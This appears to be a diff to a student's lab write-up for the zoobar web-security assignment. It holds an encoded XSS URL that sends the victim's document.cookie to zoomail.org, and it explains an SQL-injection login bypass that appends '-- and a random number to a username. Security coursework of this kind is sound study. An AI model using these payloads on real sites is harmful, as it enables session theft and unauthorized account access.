@@ -34,3 +34,48 @@ http://zoobar.org/users.php?user=\"\>\<script\>new\ Image().src\=\'http\:\/\/zoo
 
 http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dpmcollins2\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E
 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Attack C
+
+The goal of this attack was to create an HTML document that a user can load.
+Then they can enter a username into a text field and log the user into zoobar.org 
+under that username.  This was accomplished using SQL injection and will work with 
+any username that is already registered on zoobar.
+
+The HTML document first posts a form that allows the user to input a name and
+password and then submit them.  When the user submits, the javascript attack()
+function is run.  This takes the submitted username and appends '-- to it.
+
+When the user submits the username, it will be submitted as a registration for
+username'--.   This occurs in auth.php in the function _addRegistration.  It
+will search the database for a user id associated with the given username. Since
+the $quoteduser variable is escaped with an endquote, it will search the
+database for username'--, which doesn't exist.  It will then add this user to
+the database and then proceed to log them in with the _checkLogin function.
+
+The _checkLogin function also escapes the $quoteduser input, so it will search
+for our newly entered username'--.   It then hashes the password and searches
+for an entry with the specified username and hashed password to see if there is
+a match.  However, this $username variable is not escaped, so
+
+$sql = "SELECT * FROM Person WHERE Username = '$username' AND Password = '$hashedpassword';
+
+becomes
+
+$sql = "SELECT * FROM Person WHERE Username = 'username'--' AND Password = '$hashedpassword';
+
+The -- acts like a comment in SQL and the end of the query will be ignored, so
+the password will not be checked.  Then _setCookie is called and sets the current
+username, password, and id to those of the user we specified, and we are logged in
+successfully.
+
+One more issue with this attack is that it can only be executed once because it 
+will only work if the username we specify is not already in the database.  To fix
+this, we appended a random number to the end of the username after the '--
+
+ "'--" + Math.round(Math.random()*Math.pow(2, 31))
+
+Since it occurs after the comment, it will also be ignored when doing the password
+check.  It will ensure that performing the attack multiple times will not fail
+because we are using a new username every time.
